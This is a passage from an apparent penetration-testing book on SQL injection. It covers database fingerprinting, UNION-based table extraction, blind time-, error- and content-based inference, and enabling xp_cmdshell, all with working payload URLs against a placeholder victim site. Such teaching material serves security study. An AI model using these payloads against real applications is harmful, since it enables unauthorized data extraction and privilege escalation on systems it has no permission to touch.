following: select name,phone,email from people where name like ‘%smith%’ the resultant page will contain a message similar to this: 100 results founds for smith to retrieve the database version, you can inject on the name parameter as follows: http://www.victim.com/searchpeople.asp?name=‘%2b@@version%2b’ the resultant query will therefore become: select name,phone,email from people where name like ‘%’+@@version+‘%’ this query will look for names that contain the string stored in @@version, which will probably be zero; however, the resultant page will have all the information you are looking for (in this case we assume that the target database server is microsoft sql server 2000): 0 results found for microsoft sql server 2000 – 8.00.194 (intel x86) aug 6 2000 00:57:48 copyright (c) 1988–2000 microsoft corporation standard edition on windows nt 5.0 (build 2195: service pack 4) you can repeat these techniques for other pieces of information that can be useful for obtaining a more accurate fingerprint. here are some of the most useful m icrosoft sql server built-in variables: • @@version : database server version. • @@servername: name of the server where sql server is installed. • @@language : name of the language that is currently used. • @@spid: process id of the current user. • detailed version information can also be found using the following queries: • select serverproperty(‘productversion’) : for example, 100.1600.22 • select serverproperty(‘productlevel’) : for example, rtm • select serverproperty(‘edition’) : for example, enterprise • exec master..msver : for even more verbose information, including number of processors, processor type, physical memory and more blind fingerprint if the application does not return the desired information directly in the response, you need an indirect appro ach in order to understand the technology that is used in the back- end. such an indirect approach is based on the subtle differences in the sql dialects the different database servers use. the most common technique leverages the differences in how the vari ous products concatenate strings. let’s take the following simple query as an example: select ‘somestring’ this query is valid for all major database servers, but if you want to split the string into two substrings, the differences start to appear. more specifically, you can use the differences noted in table 4.2. table 4.2 inferring the database server version from strings database server query microsoft sql server select ‘some’ + ‘string’ mysql select ‘some’ ‘string’ select concat(‘some’,‘string’) oracle select ‘some’ || ‘string’ select concat(‘some’,‘string’) postgresql select ‘some’ || ‘string’ select concat(‘some’,‘string’) therefore, if you have an injectable string parameter, you can try the different concatenation syntaxes. depending on which one of them returns the same result as the original request, you can infer the remote database technology. in case you don’t have a vulnerable string parameter available, you can perform a similar technique for numeric parameters. more specifically, you need an sql statement tha t, on a specific technology, evaluates to a number. all of the expressions in table 4.3 will evaluate to an integer number on the correct database and will generate an error on all others. table 4.3 inferring the data base server version from numeric functions database server query microsoft sql server @@pack_received @@rowcount mysql connection_id() last_insert_id() row_count() oracle bitand(1,1) postgresql select extract(dow from now()) finally, simply using some specific sql construct that is peculiar to a particular dialect is another effective technique that works very well in most situations. for instance, successfully injecting a waitfor delay is a clear sign that microsoft sql server is used on the other side, whereas successfully injecting a select pg_sleep(10) will be a sure sign that we are dealing with postgresql (and also that its version is at least 8.2). if you are dealing with mysql, there is a very interesting trick that allows you to determine its exact version. we know that comments on mysql can be included in three different ways: 1. a # character at the end of the line. 2. a “ --” sequence at the end of the line (don’t forget the space after the second hyphen). 3. a “/∗” sequence followed by a “∗/” sequence, with the characters in between being the comment. the third syntax allows further tweaking: if you add an exclamation mark followed by a version number at the beginning of the comment, the comment will be parsed as code and will be executed only if the version installed is greater than or equal to the version indicated in the comment. sounds complicated? take a look at the following mysql query: select 1 / ∗!40119 + 1∗ / this query will retur n the following results: • 2 if the version of mysql is 4.01.19 or later. • 1 otherwise. don’t forget that some sql injection tools provide some level of help in terms of identifying the remote database server. one of them is sqlmap ( http://sqlmap.sourceforge.net ), which has an extensive database of signatures to help you in the fingerprinting task. we will cover sqlmap in more detail at the end of this chapter. if you know that you are dealing with microsoft sq l server, sqlninja (also covered at the end of this chapter) allows you to fingerprint the database server version, the database user and its privileges, what kind of authentication is used (mixed or windows -only) and whether sqlservr.exe is running as system. extracting data through union statements by this point, you should have a clear idea of the database server technology you are dealing with. we will continue our journey across all possible sql injection techniques with the union operator which is one of the most useful tools that a database administrator (dba) has at his disposal: you use it to combine the results of two or more select statements. its basic syntax is as follows: select column- 1,column- 2,...,column- n from table- 1 union select column- 1,column- 2,...,column- n from table- 2 this query, once executed, will do exactly what you think: it will return a table that includes the results returned by both select statements. by default, this will include only distinct values. if you want to include duplicate values in the resultant table, you need to slightly modify the syntax: select column- 1,column- 2,...,column- n from table- 1 union all select column- 1,column- 2,...,column- n from table- 2 the potential of this operator in an sql injection atta ck is evident: if the application returns all the data returned by the first (original) query, by injecting a union followed by another arbitrary query you can read any table to which the database user has access. sounds easy, doesn’t it? well, it is, but there are a few rules to follow, which will be explained in the following subsections. matching columns to work properly, the union operator needs the following requirements to be satisfied: • the two queries must return exactly the same number of columns. • the data in the corresponding columns of the two select statements must be of the same (or at least compatible) types. if these two constraints are not satisfied, the query will fail and an error will be returned. the exact error message, of course, dep ends on which database server technology is used at the back -end, which can be useful as a fingerprinting tool in case the web application returns the whole message to the user. table 4.4 contains a list of the error messages that some of the major database servers return when a union query has the wrong number of columns. table 4.4 inferring the database server version from union -based errors database server query microsoft sql all queries combined using a union, intersect or except operator database server query server must have an equal number of expressions in their target lists mysql the used select statements have a different number of columns oracle ora- 01789: query block has incorrect number of result columns postgresql error: each union query must have the same number of columns because the error messages do not provide any hints regarding the required number of columns, the only way to derive the correct number is by trial and error. there are two main methods for finding the exact number of columns. the first consists of injecti ng the second query multiple times, gradually increasing the number of columns until the query executes correctly. on most recent database servers (notably not on oracle 8i or earlier), you can inject the null value for each column, as the null value can b e converted to any other data type, therefore avoiding errors caused by different data types in the same column. so, for instance, if you need to find the correct number of columns of the query executed by the products.asp page, you can request urls such a s the following until no error is returned: http://www.victim.com/products.asp?id=12+union+select+null -- http://www.victim.com/products.asp?id=12+union+select+null,null-- http://www.victim.com/products.asp?id=12+union+select+null,null,null-- note that oracle requires that every select query contains a from attribute. therefore, if you are dealing with oracle, you should modify the previous url as follows: http://www.victim.com/products.asp?id=12+union+select+null+from+dual-- dual is a table that is accessib le by all users, and allows you to use a select statement even when you are not interested in extracting data from a particular table, such as in this case. another way to reconstruct the same information is to use the order by clause instead of injecting another query. order by can accept a column name as a parameter, but also a simple number to identify a specific column. you can therefore identify the number of columns in the query by incrementing the order by column number as follows: http://www.victim. com/products.asp?id=12+order+by+1 http://www.victim.com/products.asp?id=12+order+by+2 http://www.victim.com/products.asp?id=12+order+by+3 etc. if you receive the first error when using order by 6 , it means your query has exactly five columns. which method should you choose? the second method is usually better, and for two main reasons. to begin with, the order by method is faster, especially if the table has a large number of columns. if the correct number of columns is n, the first method will need n reque sts to find the exact number. this is because this method will always generate an error unless you use the right value. on the other hand, the second method generates an error only when you use a number that is larger than the correct one. this means you c an use a binary search for the correct number. for instance, assuming that your table has 13 columns, you can go through the following steps: 1. start trying with order by 8 , which does not return an error. this means the correct number of columns is 8 or greater. 2. try again with order by 16 , which does return an error. you therefore know that the correct number of columns is between 8 and 15. 3. try with order by 12 , which does not return an error. you now know that the correct number of columns is between 12 and 15. 4. try with order by 14 , which does return an error. you now know that the correct number is either 12 or 13. 5. try with order by 13 , which does not re turn an error. this is the correct number of columns. you therefore have used five requests instead of 13. for readers who like mathematical expressions, a binary search to retrieve a value n from the database needs o(log( n)) connections. a second good rea son to use the order by method is the fact that it has a far smaller footprint, because it will usually leave far fewer errors on the database logs. matching data types once you have identified the exact number of columns, it’s time to choose one or more of them to visualize the data you are looking for. however, as was mentioned earlier, the data types of the corresponding columns must be of a compatible type. therefore, assuming that you are interested in extracting a string value (e.g. the current database user), you need to find at least one column that has a string as the data type, to use that column to store the data you are looking for. this is simple to do with null s, as you only need to substitute, one column at a time, one null with a sample strin g. so, for instance, if you found that the original query has four columns, you should try the following urls: http://www.victim.com/products.asp?id=12+union+select+‘test’,null,null,null http://www.victim.com/products.asp?id=12+union+select+null,‘test’,null,null http://www.victim.com/products.asp?id=12+union+select+null,null,‘test’,null http://www.victim.com/products.asp?id=12+union+select+null,null,null,‘test’ for databases where using null is not possible (such as oracle 8i), the only way to derive this information is through brute -force guessing. this approach can be very time -consuming, as each combination of possible data types must be tried, and is therefore practical with only small numbers of columns. one tool that can help automate this type of column guessing is unibrute, which is available at https://github.com/gdssecurity/unibrute . as soon as the application does not return an error, you will know that the column you just used to store the test value can hold a string, and that it therefore can be used to display your data. for instance, if the second column can contain a string field, and assuming that you want to obtain the name of the current user, you can simply request the following url : http://www.victim.com/products.asp?id=12+union+select+null,system_user,null,null such a query will result in a screenshot similar to the one in figure 4.4. figure 4.4 example of a successful union -based sql injection success! as you can see, the table now contains a new row that contains the data you were looking for! a lso, you can easily generalize this attack to extract entire databases one piece at a time, as you will see shortly. however, before moving on, another couple of tricks are needed to illustrate that it can be useful when using union to extract data. in the preceding case, we have four different columns that we can play with: two of them contain a string and two of them contain an integer. in such a scenario, you could therefore use multiple columns to extract data. for instance, the following url would retr ieve both the name of the current user and the name of the current database: http://www.victim.com/products.asp?id=12+union+select+null,system_user,db_name(),null however, you might not be so lucky, because you could have only one column that can contains the data you are interested in, and several pieces of data to extract. obviously, you could simply perform one request for each piece of information, but luckily we have a better (and faster) alternative. take a look at the following query, which uses the concatenation operator for sql server (refer to table 4.2 earlier in the chapter for concatenation operators for other database server platforms): select null, system_user + ‘ | ’ + db_name(), null, null this query concatenates the values of system_user and db_name() (with an extra “|” character in between to improve readability) into one column, and translates into the following url: http://www.victim.com/products.asp?id=12+union+select+null,system_user%2b‘+|+’%2bdb_name(),n ull,null submitting this request results in the page shown in figure 4.5. figure 4.5 using the same column for multiple d ata as you can see, we have been able to link together multiple pieces of information and return them in a single column. you can also use this technique to link different columns, such as in the following query: select column1 from table 1 union select columna + ‘ | ’ + columnb from tablea note that column1, columna , and columnb must be strings for this to work. if this is not the case, you have another weapon in your arsenal, because you can try casting to a string the columns whose data is of a different type. table 4.5 lists the syntax for converting arbitrary data to a string for the various databases. table 4.5 cast operators database server query microsoft sql s erver select cast(‘123’ as varchar) mysql select cast(‘123’ as char) oracle select cast(1 as char) from dual postgresql select cast(123 as text) remember that depending on the constructs you use to extract data, you don’t always need to cast: for instance, postgresql allows non- string variables to be used with the concatenation operator (||) as long as at least one input is a string. so far, we hav e shown examples in which a union select query was used to extract only one piece of information (e.g. the database name). however, the real power of union -based sql injection becomes evident when you use it to extract entire tables at once. if the web application is written so that it will correctly present the data returned by the union select in addition to the original query, why not leverage that to retrieve as much data as possible with each query? let us say you know the current database has a table called customers and that the table contains the columns userid, first_name , and last_name (you will see how to retrieve such information when enumeration of the database schema is illustrated later in this chapter). from what you have seen so far, you know you can use the following url to retrieve the usernames: http://www.victim.com/products.asp?id=12+union+select+userid,first_name,second_name,null+fro m+customers when you submit this url you will obtain the response shown in figure 4.6. figure 4.6 using union select queries to extract multip le rows in a single request one url and you have the full listing of users! although this is great, very often you will have to deal with applications that, although vulnerable to union -based sql injection, will show only the first row of results. in other words, the union query is successfully injected and successfully executed by the back -end database which dutifully sends back all the rows, but then the web application (the products.asp file, in this case) will parse and visualize only the first row. how can you exploit the vulnerability in such a case? if you are trying to extract only one row of information, such as for the current user’s name, you need to get rid of the original row of results. as an example, here’s the url we used a few pages back to retrieve the name of the database user running the queries: http://www.victim.com/products.asp?id=12+union+select+null,system_user,null,null this url will probably make the remote database server execute a query such as the following: select id,type,description,price from products where id = 12 union select null,system_user,null,null to prevent the query from returning the first row of the result (the one containing the item details) you need to add a condition that always makes the where clause false, befo re injecting the union query. for instance, you can inject the following: http://www.victim.com/products.asp?id=12+and+1=0+union+select+null,system_user, null, null the resultant query that is passed at the database now becomes the following: select id,type,name,price from e- shops..products where id = 12 and 1=0 union select null,system_user,null,null because the value 1 is never equal to the value 0, the first where will always be false, the data of the product with id 12 will not be returned, and the only row the application will return will contain the value system_user . with an additional trick, you can use the same technique to extract the values of entire tables, such as the customers table, one row at a time. the first row is retrieved with the following url, which will remove the original row using the “1=0” inequality: http://www.victim.com/products.asp?id=12+and+1=0+union+select+userid,first_name,second_name, null+from+customers this url will return one line of data that will contain the first and last names of the first customer —charles smith, whose user id equals 1. to proceed with the following customer you just need to add another condition that removes from the results the customers whose names have been already retrieved: http://www.victim.com/products.asp?id=12+and+1=0+union+select+userid,first_name,second_name, null+from+customers+where+userid+>+1 this query will remove the original row (the one containing the product details) with the and 1=0 clause, and return the first row con taining a client with a userid value of more than 1. this will result in the response shown in figure 4.7. figure 4.7 looping through the rows of a table with union select further increasing the value of the userid parameter will allow you to loop through the whole table, extracting the full list of the customers of victim.com. using conditional statements using union to inject arbitrary queries is a fast and efficient method of extracting data. however, this is not always possible; web applications, even when they are vulnerable, are not always willing to give their data away so easily. fortunately, several other techniques work equally well, albeit not always as quickly and easily. and even the most successful and spectacular “jackpot” of an sql injection attack, usually consisting of dumping entire databases or obtaining interactive access to the database server, often begins by extracting pieces of data that are far smaller than what a union statement can achieve. in several cases, these pieces of data comprise just one bit of informa tion, because they are the outcome of queries that have only two possible answers: “yes” or “no.” even if such queries allow such a minimal amount of data extraction, they are extremely powerful and are one of the deadliest exploitation vectors available. such queries can always be expressed in the following form: if condition then do_something else do_something_else david litchfield and chris anley have extensively researched and developed this concept, and have authored several white papers on the topic. the general idea is to force the database to behave in different ways and return a different result depending on the specified condition. such a condition could be the value of a specific bit of a specific byte of data (which we’ll explore in more detail i n chapter 5 ), but in the initial attack stages it usually deals with the configuration of the database. to begin with, however, let’s see how the same basic conditional statement translates in the syntax of the different database server technologies in table 4.6. table 4.6 conditional statements database server query microsoft sql server if (‘a’=‘a’) select 1 else select 2 mysql select if(‘a’, 1, 2) oracle select case when ‘a’ = ‘a’ then 1 else 2 end from dual select decode(substr(user,1,1),‘a’,1,2) from dual postgresql select case when (1=1) then ‘a’ else ‘b’ end approach 1: time -based a first possible approach in exploiting an sql injection using conditional statements is based on different times that a web application takes to respond, depending on the value of some piece of information. on sql server, for instance, one of the first things you might want to know is whether the user performing the queries is the system administrator account, sa . this is obviously important, because depending on your privileges you will be able to perform different actions on the remote database. therefor e, you can inject the following query: if (system_user = ‘sa’) waitfor delay ‘0:0:5’ -- which translates into the following url: http://www.victim.com/products.asp?id=12;if+(system_user=‘sa’)+waitfor+delay+‘0:0:5’-- what happens here? system_user is simply a transact -sql (t -sql) function that returns the current login name (e.g. sa ). depending on the value of system_user , the query will execute waitfor (and will wait 5 s). by measuring the time it takes for the application to return the html page, you can d etermine whether you are sa. the two hyphens at the end of the query are used to comment out any spurious sql code that might be present from the original query and that might interfere with your code. the value used ( 5, for 5 s) is arbitrary; you could ha ve used any other value between 1 s (waitfor delay ‘0:0:1’ ) and 24 h (well, almost, as waitfor delay ‘23:59:59’ is the longest delay this command will accept). five seconds was used because it is a reasonable balance between speed and reliability; a shorte r value would give us a faster response, but it might be less accurate in the case of unexpected network delays or load peaks on the remote server. of course, you can replicate the same approach for any other piece of information in the database, simply by substituting the condition between parentheses. for instance, do you want to know whether the remote database version is 2005? take a look at the following query: if (substring((select @@version),25,1) = 5) waitfor delay ‘0:0:5’ -- we start by selecting t he @@version built-in variable, which, in an sql server 2005 installation, will look somewhat like the following: microsoft sql server 2005 – 9.00.3042.00 (intel x86) feb 9 2007 22:47:07 copyright (c) 1988 –2005 microsoft corporation standard edition on win dows nt 5.2 (build 3790: service pack 2) as you can see, this variable contains the database version. to understand whether the remote database is sql server 2005, you only need to check the last digit of the year, which happens to be the 25th character of that string. that same character will ob viously be different from “5” on other versions (e.g. it will be “0” on sql server 2000). therefore, once you have this string you pass it to the substring() function. this function is used to extract a part of a string and takes three parameters: the orig inal string, the position where you must begin to extract, and the number of characters to extract. in this case, we extract only the 25th character and compare it to the value 5. if the two values are the same, we wait the usual 5 s. if the application ta kes 5 s to return, we will be sure that the remote database is actually an sql server 2005 database. sometimes, however, the product’s main version (2000, 2005, 2008, or 2012) is not enough, and you need to know the exact product version, because this can be very useful when you need to know if a database server is missing a specific update and therefore whether it is vulnerable to a particular attack. for instance, we will probably want to know whether this instance of sql server 2005 has not been patched against ms09- 004 (“sp_replwritetovarbin” remote memory corruption vulnerability), which could allow us to escalate our privileges. for this information, all we need to do is to fingerprint the exact version. if sql server has been patched for that specific vulnerability, the product version is at least one of the following: • sql server 2005 gdr 9.00.3077 • sql server 2005 qfe 9.00.3310 • sql server 2000 gdr 8.00.2055 • sql server 2000 qfe 8.00.2282 it would only take a few requests to fingerprint the exact version, and to discover that the database administrator (dba) of the sql server installation in our previous example forgot to apply some updates. now we know which attacks are likely to work. table 4.7 provides a ( partial) list of the releases of microsoft sql server together with the corresponding version numbers and information about some of the vulnerabilities that have affected the product. table 4.7 ms sql version numbers version produc t 10.50.2500.0 sql server 2008 r2 sp1 10.50.1790 sql server 2008 r2 qfe (ms11- 049 patched) version produc t 10.50.1617 sql server 2008 r2 gdr (ms11- 049 patched) 10.50.1600.1 sql server 2008 r2 rtm 10.00.5500 sql server 2008 sp3 10.00.4311 sql server 2008 sp2 qfe (ms11- 049 patched) 10.00.4064 sql server 2008 sp2 gdr (ms11- 049 patched) 10.00.4000 sql server 2008 sp2 10.00.2841 sql server 2008 sp1 qfe (ms11- 049 patched) 10.00.2840 sql server 2008 sp1 gdr (ms11- 049 patched) 10.00.2531 sql server 2008 sp1 10.00.1600 sql server 2008 rtm 9.00.5292 sql server 2005 sp4 qfe (ms11- 049 patched) 9.00.5057 sql server 2005 sp4 gdr (ms11- 049 patched) 9.00.5000 sql server 2005 sp4 version produc t 9.00.4340 sql server 2005 sp3 qfe (ms11- 049 patched) 9.00.4060 sql server 2005 sp3 gdr (ms11- 049 patched) 9.00.4035 sql server 2005 sp3 9.00.3310 sql server 2005 sp2 qfe (ms09- 004 patched) 9.00.3077 sql server 2005 sp2 gdr (ms09- 004 patched) 9.00.3042.01 sql server 2005 sp2a 9.00.3042 sql server 2005 sp2 9.00.2047 sql server 2005 sp1 9.00.1399 sql server 2005 rtm 8.00.2282 sql server 2000 sp4 qfe (ms09- 004 patched) 8.00.2055 sql server 2000 sp4 gdr (ms09- 004 patched) 8.00.2039 sql server 2000 sp4 8.00.0760 sql server 2000 sp3 version produc t 8.00.0534 sql server 2000 sp2 8.00.0384 sql server 2000 sp1 8.00.0194 sql server 2000 rtm an updated and far more exhaustive list, complete with the exact release date of each number, is currently maintained by bill graziano and can be found at the address http://www.sqlteam.com/article/sql- server -versions . if you have administrative privileges, you can use the xp_cmdshell extended procedure to generate a delay by launching a command that takes a certain number of seconds to complete, as in the following example which will ping the loopback interface for 5 s: exec master..xp_cmdshell ‘ping - n 5 127.0.0.1’ if you have administrative access but xp_cmdshell is not enabled, you can easily enable it with the following commands on sql server 2005 and 2008: exec sp_configure ‘show advanc ed options’, 1; go reconfigure; exec sp_configure ‘xp_cmdshell’,1; on sql server 2000, the following command is enough: exec master..sp_addextendedproc ‘xp_cmdshell’,‘xplog70.dll’ more information on xp_cmdshell and how to enable it in various situations c an be found in chapter 6 . so far, you have seen how to generate delays on sql server, but the same concept is applicable on other database technologies. for instance, on mysql you can create a delay of a few seconds with the following query: select benchmark(1000000,sha1(‘blah’)); the benchmark function executes the expression described by the second parameter for the number of times specified by the first parameter. it is normally used to measure server performance, but it is also very useful for introducing an artificial delay. in this case, we tell the database to calculate the sha1 hash of the string “blah” 1 million times. if you are dealing with an installation of mysql that is at least 5.0.12, things are even easier: select sleep(5); if you are against a postgresql installatio n and its version is at least 8.2, you can use the following instead: select pg_sleep(5); for older postgresql databases, things are a bit more difficult, but if you have the necessary privileges to create custom functions then you might have some luck wit h the following technique shown by nico leidecker, which maps the underlying unix operating system sleep command: create or replace function sleep(int) returns int as ‘/lib/libc.so.6’, ‘sleep’ language ‘c’ strict; select sleep(10); regarding oracle, you can achieve the same effect (although less reliably) by generating an http request to a “dead” internet protocol (ip) address, using utl_http or httpuritype. if you specify an ip address where no one is listening, the following queries will wait for the connection attempt to time out: select utl_http.request (‘http://10.0.0.1/ ’) from dual; select httpuritype(‘http://10.0.0.1/’).getclob() from dual; an alternative to using the network timing approach is to use a simple cartesian product. a count(∗) on four tables takes much more time than returning a number. the following query returns a number after counting all rows in a cartesian product (which could become really big and time -intensive) if th e first character of the username is a : select decode(substr(user,1,1),‘a’,(select count(∗ ) from all_objects,all_objects,all_objects,all_objects),0) easy, isn’t it? well, keep reading, because things are going to get even more interesting. approach 2: erro r-based the time -based approach is extremely flexible, and it is guaranteed to work in very difficult scenarios because it uniquely relies on timing and not on the application output. for this reason, it is very useful in pure -blind scenarios, which we wil l analyze in depth in chapter 5 . however, it is not suited to extracting more than a few bits of information. assuming that each bit has the same probability of being 1 or 0, and assuming that we used 5 s as the parameter to waitfor , each query would take an average of 2.5 s (plus any additional network delay) to return, making the process painstakingly slow. you could reduce the parameter passed to waitfor, but that would likely introduce errors. luckily, we have in our bag other techniques that will trigger different responses depending on the value of the bit that we are looking for. take a look at the following query: http://www.victim.com/products.asp?id=12/is_srvrolemember(‘sysadmin’) is_srvrolemember() is an sql server t -sql function that returns the following values: • 1 if the user is part of the specified group. • 0 if it is not part of the group. • null if the specified group does not exist. if our user belongs to the sysadmin group, the id parameter will be equal to 12/1, which is equal to 12, and the application will therefore return the old page describing the syngress book. however, if the current user is not a member of sysadmin, the i dparameter will have the value 12/0, which is obviously not a number. this will make the query fail, and the application will return an error. the exact error message can obviously vary a lot: it could be simply a “500 internal server error ” returned by the web ser ver, or it might contain the full sql server error message, which will look like the screenshot in figure 4.8. figure 4.8 error message as a result of a divide -by-zero it might also be a generic html page that is used to make the application fail gracefully, but the bottom line is the same: depending on the value of a specific bit, you can trigger different responses, and therefore extract the value of the bit itself. you can easily extend this principle to other types of queries, and for this purpose the case statement is introduced, which is supported by the majority of database servers and can be injected inside an existing query, making it also available when stacked queries cannot be used. the case statement has the following syntax: case when condition then action1 else action2 end as an example, let’s see how we can use a case statement to check, in our e -commerce application, whether the current user is sa : http://www.victim.com/products.asp?id=12/(case+when+(system_user=‘sa’)+then+1+else+0+end) approach 3: content -based a big advantage of the error -based approach, compared to waitfor , is speed: each request returns with a result immediately, independently fr om the value of the bit that you are extracting, as there are no delays involved. one disadvantage, however, is that it triggers a lot of errors, which might not always be desirable. luckily, it is often possible to slightly modify the same technique to av oid the generation of errors. let’s take the last url and modify it slightly: http://www.victim.com/products.asp?id=12%2b(case+when+(system_user+=+‘sa’)+then+1+else+0+end ) the only difference is that we substituted the “/” character after the parameter wit h %2b, which is the url -encoded version of “+” (we can’t simply use a “+” in the url, as it would be interpreted as whitespace). the value of the id parameter is therefore given by the following formula: id = 12 + (case when (system_user = ‘sa’) then 1 else 0 end) the result is pretty straightforward. if the user performing the queries is not sa , then id=12 , and the request will be equivalent to: http://www.victim.com/products.asp?id=12 on the other hand, if the user performing the queries is sa , then id=13 and the request will be equivalent to: http://www.victim.com/products.asp?id=13 because we are talking about a product catalog, the two urls will likely return two different items: the first url will still return the syngress book, but the second might re turn, say, a microwave oven. so, depending on whether the returned html contains the string syngress or the string oven , we will know whether our user is sa or not. this technique is still as fast as the error -based one, but with the additional advantage t hat no errors are triggered, making this approach a lot more elegant. working with strings you might have noticed that in the previous examples the injectable parameter was always a number, and that we used some algebraic trick to trigger the different res ponses (whether error -based or content -based). however, a lot of parameters vulnerable to sql injection are strings, not numbers. luckily, you can apply the same approach to a string parameter, with just a minor twist. let’s assume that our e -commerce web site has a function that allows the user to retrieve all the products that are produced by a certain brand, and that this function is called via the following url: http://www.victim.com/search.asp?brand=acme this url, when called, performs the following query in the back -end database: select ∗ from products where brand = ‘ acme’ what happens if we slightly modify the brand parameter? let’s say we substitute the m with an l. the resultant url will be the following: http://www.victim.com/search.asp?brand=acle this url will likely return something very different; probably an empty result set, or in any case a very different one. whatever the exact result of the second url is, if the brand parameter is injectable, it is easy to extract data by playing a bit with string concatenation. let’s analyze the process step by step. the string to be passed as a parameter can obviously be split into two parts: http://www.victim.com/search.asp?brand=acm‘%2b’e because % 2b is the url -encoded version of the plus sign, the resultant query (for microsoft sql server) will be the following: select ∗ from products where brand = ‘ acm’+‘e’ this query is obviously equivalent to the previous one, and therefore the resultant html page will not vary. we can push this one step further, and split the parameter into three parts instead of two: http://www.victim.com/search.asp?brand=ac‘%2b’m‘%2b’e now, the character m in t-sql can be expressed with the char() function, which takes a number a s a parameter and returns the corresponding ascii character. because the ascii value of m is 109 (or 0x6d in hexadecimal), we can further modify the url as follows: http://www.victim.com/search.asp?brand=ac‘%2bchar(109)%2b’e the resultant query will theref ore become: select ∗ from products where brand = ‘ ac’+char(109)+‘ e’ again, the query will still return the same results, but this time we have a numeric parameter that we can play with, so we can easily replicate what we saw in the previous section by subm itting the following request: http://www.victim.com/search.asp?brand=ac‘%2bchar(108%2b(case+when+(system_user+=+‘sa’)+then +1+else+0+end)%2b’e it looks a bit complicated now, but let’s see what is going on in the resultant query: select ∗ from products where brand = ‘ac’+char(108+(case when+(system_user=‘sa’) then 1 else 0 end) + ‘e’ depending on whether the current user is sa or not, the argument of char() will be 109 or 108, respectively, returning therefore m or l. in the former case, the string resulting from the first concatenation will be acme, whereas in the second it will be acle. therefore, if the user is sa the last url is equivalent to the following: http://www.victim.com/search.asp?brand=acme otherwise, the url will be equivalent to the following: http://www.victim.com/search.asp?brand=acle because the two pages return different results, here we have a safe method for extracting data using conditional statements for string parameters as well. extending the attack the examples we’ve covered so far are focused on retrieving pieces of information that can have only two possible values —for example, whether the user is the database administrator or not. however, you can easily extend this technique to arbitrary data. obviously, because conditional statements by definition can retrieve only one bit of information (as they can infer only whether a condition is true or false), you will need as many connections as the number of bits composing the data in which you are interested. as an example let’s return to the user who performs the queries. instead of limiting ourselves to check whether the user is sa , let’s retrieve the user’s whole name. the first thing to do is to discover the length of the username. you can do that using the following query: select len(system_user) assuming that the username is appdbuser , this query will return the value 9. to extract this value using conditional statements, you need to perform a binary search. assuming that you use the error -based method that was illustrated a few pages ago, the following urls will be sent: http://www.victim.com/products.asp?id=10/(case+when+(len(system_user)+>+8)+then+1+else+0+end ) because our username is longer than eight characters, this url will not generate an error. we continue with our binary sear ch with the following queries: http://www.victim.com/products.asp?id=12/(case+when+(len(system_user)+>+16)+then+1+else+0+en d) --->error http://www.victim.com/products.asp?id=12/(case+when+(len(system_user)+>+12)+then+1+else+0+en d) --->error http://www.victim.com/products.asp?id=12/(case+when+(len(system_user)+>+10)+then+1+else+0+en d) --->error http://www.victim.com/products.asp?id=12/(case+when+(len(system_user)+>+9)+then+1+else+0+end ) --->error done! because the (len(system_user) > 8) condit ion is true and the (len(system_user) > 9) condition is false, we know that our username is nine characters long. now that we know the length of the username, we need to extract the characters that compose the username. to perform this task we will cycle t hrough the various characters, and for each of them we will perform a binary search on the ascii value of the letter itself. on sql server, to extract a specific character and calculate its ascii value you can use the following expression: ascii(substring((select system_user),1,1)) this expression retrieves the value of system_user , extracts a substring that starts from the first character and that is exactly one character long, and calculates its decimal ascii value. therefore, the following urls will be used: http://www.victim.com/products.asp?id=12/(case+when+(ascii(substring(select+system_user),1,1 ))+>+64)+then+1+else+0+end) --->ok http://www.victim.com/products.asp?id=12/(case+when+(ascii(substring(select+system_user),1,1 ))+>+128)+then+1+else+0+end) --->error http://www.victim.com/products.asp?id=12/(case+when+(ascii(substring(select+system_user),1,1 ))+>+96)+then+1+else+0+end) --->ok <etc.> the binary search will continue until the character a (ascii: 97 or 0x61) is found. at that point, the procedure wi ll be repeated for the second character, and so on. you can use the same approach to extract arbitrary data from the database, but it is very easy to see that this technique requires a large number of requests in order to extract any reasonable amount of information. several free tools can automate this process, but nevertheless this approach is not recommended for extracting large amounts of data such as entire databases. using errors for sql injection you have already seen that in a non -blind sql injectio n scenario database errors are very helpful in providing the attacker with the information necessary to craft correct arbitrary queries. you also discovered that, once you know how to craft correct queries, you can leverage error messages to retrieve infor mation from the database, by using conditional statements that allow you to extract one bit of data at a time. however, in some cases error messages can also be used for much faster data extraction. earlier in the chapter, we used an error message to discl ose the sql server version by injecting the string @@version where a numeric value was expected, generating an error message with the value of the @@version variable. this works because sql server produces far more verbose error messages compared to other databases. well, this feature can be abused to extract arbitrary information from the database, and not just its version. for instance, we might be interested in knowing which database user performs the query on the database server: http://www.victim.com/p roducts.asp?id=system_user requesting this url will generate the following error: microsoft ole db provider for odbc drivers error ‘80040e07’ [microsoft][odbc sql server driver][sql server]conversion failed when converting the nvarchar value ‘appdbuser’ to data type int. /products.asp, line 33 you already saw how to determine whether our user belongs to the sysadmin group, but let’s see another way to get the same information using this error message, by using the value returned by is_srvrolemember to gener ate the string that will trigger the cast error: http://www.victim.com/products.asp?id=char(65%2bis_srvrolemember(‘sysadmin’)) what is happening here? the number 65 is the decimal ascii value of the character a , and %2b is the url -encoded version of the “+ ” sign. if the current user does not belong to the sysadmin group, is_srvrolemember will return 0, and char(65+0) will return the a character. on the other hand, if the current user has administrative privileges, is_srvrolemember will return 1, and char(66) will return b, again triggering the casting error. trying the query, we receive the following error: microsoft ole db provider for odbc drivers error ‘80040e07’ [microsoft][odbc sql server driver][sql server]conversion failed when converting the nvarchar value ‘b’ to data type int. /products.asp, line 33 it appears as though we have a b, which means that our database user has administrative privileges! you can consider this last attack as a sort of hybrid between content -based conditional injection and error -based conditional injection. as you can see, sql injection attacks can come in s o many forms that it’s impossible to capture all of them in one book, so don’t forget to use your creativity. being able to think out of the box is the key skill of a successful penetration tester. another error -based method that allows an attacker to enum erate the names of the columns being used in the current query is provided by the having clause. this clause is normally used in conjunction with group by to filter the results returned by a select statement. however, on sql server you can use it to genera te an error message that will contain the first column of the query, as in the following url: http://www.victim.com/products.asp?id=1+having+1=1 the application returns the following error: microsoft ole db provider for odbc drivers error ‘80040e14’ [microsoft][odbc sql server driver][sql server]column ‘products.id’ is invalid in the select list because it is not contained in either an aggregate function or the group by clause. /products.asp, line 233 the error message contains the names of the products table and of the id column, which is the first column used in the select . to move to the second column, we simply need to add a group by clause with the name of the column we just discovered: http://www.victim.com/products.asp?id=1+group+by+products.id+having+1=1 we now receive another error message: microsoft ole db provider for odbc drivers error ‘80040e14’ [microsoft][odbc sql server driver][sql server]column ‘products.name’ is invalid in the select list because it is not contained in either an aggregate function or the group by clause. /shop.asp, line 233 because the first column is now part of the group by clause, the error is triggered by the second column: products.name . the next step is to add this column to the group by without removing the 